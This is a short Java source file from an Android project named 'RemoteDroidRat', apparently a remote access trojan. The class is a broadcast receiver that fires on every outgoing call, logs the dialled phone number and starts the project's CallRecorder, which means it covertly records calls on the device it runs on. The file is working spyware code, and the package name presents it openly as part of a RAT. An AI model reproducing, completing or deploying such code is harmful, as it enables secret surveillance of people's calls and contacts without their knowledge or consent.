package com.KaranKumar.RemoteDroidRat.broadcasts;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;
import android.util.Log;
import com.KaranKumar.RemoteDroidRat.commandActions.CallRecorder;

public class OutgoingCallReceiver extends BroadcastReceiver {
	private CallRecorder callRecorder;
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent != null && intent.getAction() != null) {
            if (intent.getAction().equals(Intent.ACTION_NEW_OUTGOING_CALL)) {
                String phoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
                Log.d("OutgoingCallReceiver", "Outgoing call to: " + phoneNumber);
                this.callRecorder = new CallRecorder(context);
				try{
				
				callRecorder.startCallListener();
				}catch(Exception e){
					e.printStackTrace();
				}
                // Perform your desired action here
                // For example, you can start a service or show a notification
            }
        }
    }
}
